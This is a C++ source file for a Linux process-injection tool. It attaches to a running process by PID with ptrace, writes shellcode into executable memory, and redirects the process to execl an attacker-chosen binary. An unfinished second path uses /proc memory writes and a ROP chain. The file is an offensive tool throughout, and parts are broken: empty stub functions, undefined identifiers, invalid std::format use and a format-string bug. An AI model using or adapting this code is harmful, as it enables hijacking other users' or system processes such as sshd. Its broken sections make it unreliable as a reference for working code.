// this is a simple program image loader based off a few things i read
// with ptrace:
// https://papers.vx-underground.org/papers/VXUG/Mirrors/Injection/linux/blog.xpnsec.com-Linux%20ptrace%20introduction%20AKA%20injecting%20into%20sshd%20for%20fun.pdf
// https://github.com/gaffe23/linux-inject/blob/master/utils.c
//
// without ptrace:
// https://github.com/AonCyberLabs/Cexigua
// https://papers.vx-underground.org/papers/VXUG/Mirrors/Injection/linux/blog.gdssecurity.com-Linux%20based%20inter-process%20code%20injection%20withoutnbspptrace2.pdf
//
// usage: ./inject TARGET_PID TARGET_BINARY ?--ptraceless
//
// -- null333 (seroh#2009) --
//
// TODO: add option for custom libc.so or auto detection
// TODO: replace shellcode functions with lambdas <- holy fuck please dont do this - your future self
// TODO: use JIT for shellcode generation instead of the disgusting inline asm
//

#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>
#include <signal.h>
#include <cstdlib>
#include <cstring>
#include <utility>
#include <vector>
#include <iostream>
#include <format>

#define EXECL_OFF 0xE6680

// #include "asmtk/src/asmtk/asmtk.h"
// #define ASMJIT_EMBED
#include "include/asmtk/src/asmtk/asmtk.h"


class ropchain {
    public:
        std::vector<std::pair<void *, size_t>> chain_v;
        void push(void *gadget, size_t len) {
            // TODO: ensure alignment
            chain_v.push_back(std::make_pair(gadget, len));
        }
};

// notes: https://stackoverflow.com/questions/26190475/convert-assembly-to-machine-code-in-c/38936870
class shellcode_gen {
    public:
        shellcode_gen() {
            // TODO: fix this bullshit
            assembler_ptr = &asmjit::x86::Assembler(&code);
            parser_ptr = &asmtk::AsmParser(assembler_ptr);
            cb_ptr = &(code.sectionById(0)->buffer());
            code.init(rt.environment());
        }

        void gen_shellcode(char asm_raw[]) {
            // update parser
            parser_ptr->parse(asm_raw);
        }

        void *get_shellcode_ptr() {
            // return void pointer to generated function object
            return cb_ptr->data();
        }

        size_t get_shellcode_len() {
            return cb_ptr->size();
        }

    private:
        asmjit::JitRuntime rt;
        asmjit::CodeHolder code;
        asmjit::x86::Assembler *assembler_ptr;
        asmtk::AsmParser *parser_ptr;
        asmjit::CodeBuffer *cb_ptr;

};

uintptr_t get_free_addr(pid_t pid) {
    // return addr of first chunk with x perms
    char fname[30];
    sprintf(fname, "/proc/%li/maps", (long) pid);
    FILE *fp = fopen(fname, "r");
    char chunk[850]; // ex: 5646750f1000-564675135000 r-xp
    uintptr_t free_addr;
    char is_exec;
    while (fgets(chunk, 850, fp)) {
        sscanf(chunk, "%lx-%*lx %*c%*c%c%*c %*d", &free_addr, &is_exec);
        if (is_exec == 'x') {
            break;
        }
    }
    fclose(fp);
    return free_addr;
}

uintptr_t get_libc_base(pid_t pid) {
    // return libc base addrenvironment())
    char fname[30];
    sprintf(fname, "/proc/%li/maps", (long) pid);
    FILE *fp = fopen(fname, "r");
    char chunk[850];
    uintptr_t libc_base;
    while (fgets(chunk, 850, fp)) {
        sscanf(chunk, "%lx-%*lx %*c%*c%*c %*d", &libc_base);
        if (strstr(chunk, "libc-2.31.so")) {
            break;
        }
    }
    fclose(fp);
    return libc_base;
}

void ptrace_mem_write(pid_t pid, uintptr_t dest, void *data, size_t len) {
    long curr = 0;
    for (int i = 0; i < len; i += sizeof(long)) {
        if (data) {
            memcpy(&curr, data + i, sizeof(long));
        } else {
            // write NULLs
            curr = 0;
        }
        ptrace(PTRACE_POKETEXT, pid, dest + i, curr);
        curr = 0;
    }
}

void ptrace_write_ropchain(pid_t pid, uintptr_t dest, ropchain chain) {
    uintptr_t off = 0;
    for (std::pair<void *, size_t> &gadget: chain.chain_v) {
        ptrace_mem_write(pid, dest + off, gadget.first, gadget.second);
        off +=  gadget.second;
    }
}

uintptr_t get_stack_ret_addr(pid_t pid) {

}

void procmem_write(pid_t pid, uintptr_t dest, void *data, size_t len) {

}

void procmem_write_ropchain(pid_t pid, uintptr_t dest, ropchain chain) {

}

int main(int argc, char *argv[]) {
    bool use_ptrace = true;
    if (!(argc == 3 || argc == 4)) {
        std::cout << "invalid number of arguments\n";
        exit(-1);
    }

    if (argc == 4) {
        if (strcmp(argv[3], "--ptraceless") == 0) {
            use_ptrace = false;
        } else {
            std::cout << "invalid flag\n";
            exit(-1);
        }
    }

    pid_t target_pid = (pid_t) atoi(argv[1]);
    char *target_binary = argv[2];
    {
        char fname[strlen(target_binary) + 1]; // note: vulnerable to very large target bin names
        sprintf(fname, "/proc/%li/status", (long) target_pid);
        FILE *fp = fopen(fname, "r");

        if (!fp) {
            std::cout << "pid doesnt exist\n";
            exit(-1);
        }
        fclose(fp);

        memset(fname, 0, 30);
        sprintf(fname, target_binary);
        fp = fopen(fname, "r");
        if (!fp) {
            std::cout << "program image doesnt exist\n";
            exit(-1);
        }
        fclose(fp);
    }

    // parse /proc/pid/maps to get needed addrs
    uintptr_t execl_addr = get_libc_base(target_pid) + EXECL_OFF;
    uintptr_t rop_chain_addr = get_free_addr(target_pid);

    shellcode_gen sc_gen;

    if (use_ptrace) {
        // generate shellcode
        sc_gen.gen_shellcode(
            "call rax\n"
        );

        // inject shellcode with setregs and write path to target binary to target procs mem
        // injected register state:
        // eip: execl address
        // rdi: addr of path
        // rsi: NULL (0)
        // rdx: NULL (0)
        struct user_regs_struct regs;
        regs.rip = rop_chain_addr;
        regs.rax = execl_addr;
        regs.rdi = rop_chain_addr + sc_gen.get_shellcode_len();
        regs.rsi = 0;
        regs.rdx = 0;

        ropchain chain;
        chain.push(sc_gen.get_shellcode_ptr(),  sc_gen.get_shellcode_len());
        chain.push(target_binary, strlen(target_binary));

        ptrace(PTRACE_ATTACH, target_pid, NULL, NULL);
        waitpid(target_pid, NULL, 0);

        ptrace_write_ropchain(target_pid, rop_chain_addr, chain);

        ptrace(PTRACE_SETREGS, target_pid, NULL, &regs);
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 0;
    } else {
        // send pause signal
        kill(target_pid, SIGSTOP);

        // binary comes right before shellcode
        // (impossible to compute shellcode size within its own generation)
        uintptr_t target_binary_addr = rop_chain_addr;
        rop_chain_addr = rop_chain_addr + strlen(target_binary) + 1;

        // get stack ret addr and write needed variables after ret
        uintptr_t stack_ret_addr = get_stack_ret_addr(target_pid);

        // overwrite stack addr with address of rop chain
        procmem_write(target_pid, stack_ret_addr, rop_chain_addr, sizeof(rop_chain_addr));

        uintptr_t shellcode_procmem_size = (uintptr_t) shellcode_procmem_end - (uintptr_t) shellcode_procmem;

        // write rop chain to exec mapped section
        // note: need to use lambda to write this bullshit
        // rop chain:
        // - target_bin + NULL
        // - mov &target_binary, %rdi
        // - mov 0, %rsi
        // - mov 0, %rdx
        // - call execl_addr
        ropchain chain;
        sc_gen.gen_shellcode(
            std::format("mov ${}, rdi\n", (void *) target_binary_addr)
            "mov $0, rsi\n"
            "mov $0, rdx\n"
            std::format("call ${}\n", (void *) rop_chain_addr)
        );

        chain.push(target_bin, strlen(target_binary) + 1);
        chain.push(NULL, 1);
        // TODO; write helper to get THIS addr
        chain.push(sc_gen.get_shellcode_ptr(), sc_gen.get_shellcode_len());
        procmem_write_ropchain(target_pid, rop_chain_addr, chain);

        // send cont sig
        kill(target_pid, SIGCONT);
        return 0;
    }
}
